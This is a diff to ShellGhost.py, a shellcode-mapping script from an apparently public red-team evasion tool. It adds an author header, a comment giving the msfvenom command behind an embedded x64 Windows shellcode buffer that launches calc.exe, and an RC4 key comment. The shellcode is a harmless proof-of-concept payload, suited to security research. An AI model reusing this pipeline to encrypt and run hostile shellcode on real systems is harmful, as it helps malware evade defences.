@@ -1,3 +1,14 @@
+# ----------------------------------------------------------------------------------------------#
+# Author:   Angelo Frasca Caccia (lem0nSec_)                                                    #
+# Date:     16/01/2023                                                                          #
+# Title:    ShellGhost.py (shellcode mapping script for ShellGhost)                             #
+# Website:  https://github.com/lem0nSec/ShellGhost                                              #
+# Credits:  https://github.com/fishstiqz/nasmshell (nasmshell)                                  #
+#           https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071 (RC4 encryption)  #
+# ----------------------------------------------------------------------------------------------#
+
+
+
 import subprocess
 import tempfile
 import sys
@@ -6,6 +17,7 @@ from typing import Iterator
 from math import floor
 
 
+# msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -e generic/none
 buf =  b""
 buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
 buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
@@ -31,7 +43,7 @@ buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
 buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
 buf += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 
-
+# RC4 key
 key = b"\x3b\x21\xff\x41\xe3"
 
 
